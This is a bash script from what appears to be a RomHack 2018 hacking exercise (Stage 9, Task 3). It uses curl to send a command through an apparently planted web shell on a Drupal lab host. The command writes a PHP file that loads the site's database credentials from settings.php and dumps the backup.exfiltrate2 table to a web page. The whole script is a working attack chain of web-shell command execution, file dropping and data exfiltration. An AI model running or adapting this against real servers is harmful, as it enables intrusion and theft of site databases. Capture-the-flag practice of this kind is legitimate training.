#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo 
echo "STAGE9 / TASK3"
echo "Show the content of backup.exfiltrate2 DB"
echo "Write a PHP file exfiltration2-03.php on the remote server"
echo
echo "exfiltration2-03.php content:"
cat <<EOF
echo "<?php 
	require_once("settings.php");
	\$conn =  mysqli_connect(\$databases["default"]["default"]["host"], \$databases["default"]["default"]["username"], \$databases["default"]["default"]["password"]);
	\$query = mysqli_query(\$conn, "select * from backup.exfiltrate2");
	echo "<table border=1>";
	echo "<tr>";
	echo "<th>exfiltrated content</th>";
	echo "</tr>";
	while(\$row = mysqli_fetch_assoc(\$query)):
		echo "<tr>";
		echo "<td>".\$row["line"]."</td>";
		echo "</tr>";
	endwhile;
	echo "</table>";
?>" > exfiltration2-03.php
EOF
echo
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' \
	--compressed \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-GB,en;q=0.5' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	--data 'c=echo "<?php require_once(\"settings.php\");\$conn =  mysqli_connect(\$databases[\"default\"][\"default\"][\"host\"], \$databases[\"default\"][\"default\"][\"username\"], \$databases[\"default\"][\"default\"][\"password\"]);\$query = mysqli_query(\$conn, \"select * from backup.exfiltrate2\");echo \"<table border=1>\";echo \"<tr>\";echo \"<th>exfiltrated content</th>\";echo \"</tr>\";while(\$row = mysqli_fetch_assoc(\$query)):echo \"<tr>\";echo \"<td>\".\$row[\"line\"].\"</td>\";echo \"</tr>\";endwhile;echo \"</table>\";?>" > exfiltration2-03.php'
echo "------"
echo
echo "Access: http://www.org.lan/sites/default/exfiltration2-03.php"
echo "To show exfiltrated content"
echo
